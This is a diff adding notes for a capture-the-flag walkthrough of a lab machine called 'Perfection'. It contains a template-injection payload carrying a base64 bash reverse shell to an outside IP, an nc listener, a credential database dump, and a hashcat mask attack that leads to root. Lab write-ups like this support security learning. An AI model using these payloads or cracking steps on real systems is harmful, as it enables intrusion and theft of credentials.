@@ -1,0 +1,114 @@
+Perfection Lab: Vulnerabilities: Command Injection in Web Application, exposed sensitive user credential files, Unconfigured Non-privileged user permissions, 
+
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.122.234 
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
+|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Weighted Grade Calculator
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+We found a page where you can submit some information about your weight, as this is a fitness page. 
+
+POST /weighted-grade-calc HTTP/1.1
+Host: 10.129.122.234
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.122.234/weighted-grade
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+Origin: http://10.129.122.234
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+category1=hello&grade1=2&weight1=2&category2=hi&grade2=2&weight2=2&category3=hbei&grade3=2&weight3=2&category4=ehe&grade4=2&weight4=2&category5=he&grade5=2&weight5=2
+
+
+Response had this:
+Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
+
+Lateral Movement
+
+# reverse shell on attack machine
+base64 <<< "bash -i >& /dev/tcp/10.10.14.206/1234 0>&1" | sed 's/\+/\%2b/'
+-The above gives us the value of $b64 which we send as request via burp suite
+nc -lnvp 1234
+
+# burp request to send to web server usign repeater
+category1=History%0A<%25%3dsystem("echo+$b64+|+base64+-d+|+bash");%25>
+
+find . -name "*.txt" 2>/dev/null
+./home/susan/user.txt
+susan@perfection:~$ cat user	
+cat user.txt 
+7445f883fca76b34f99a358a37e66533
+
+
+Used attack machine to start http server after we have linpeas.sh on it.
+
+Went to /tmp file to get this file off our attack machine via wget https://github.com/peass-ng/PEASS-ng/releases/tag/20240630-b2cfbe8a 
+
+./linpeas.sh
+
+
+
+susan@perfection:/var/mail$ cat susan
+cat susan
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+
+susan@perfection:~$ grep -i password -R
+	-Explanation: search for password caps or no caps with recursive function
+grep -i password -R
+grep: Migration/pupilpath_credentials.db: binary file matches
+grep: .gnupg/S.gpg-agent: No such device or address
+grep: .gnupg/S.gpg-agent.extra: No such device or address
+grep: .gnupg/S.gpg-agent.ssh: No such device or address
+grep: .gnupg/S.gpg-agent.browser: No such device or address
+
+
+susan@perfection:~/Migration$ cat pupilpath_credentials.db 
+��^�ableusersusersCREATE TABLE users (
+id INTEGER PRIMARY KEY,
+name TEXT,
+password TEXT
+a�\
+David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP#Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+
+We found the hash of Susan’s password in the db file, let’s use hashcat to decrypt
+
+echo “abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f” > hash.txt
+
+hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
+	-Hashcat is using mode 1400 which is SHA256  encryption given input file hash.txt containing hash of Susan and specifies attack 3 which is brute-force the characters ?d which stands for integer value so susan_nasus_xxxxxxxxx
+
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+
+
+With the password we find what permissions susan has using sudo -l -S and login with password
+so sudo -l shows all the executable we can run as root
+
+
+
+We find out she has all permission so we do sudo su
+And we are now root
+Flag in root/root.txt : e54da971589275c7c4c29a0e5ed339f5
+
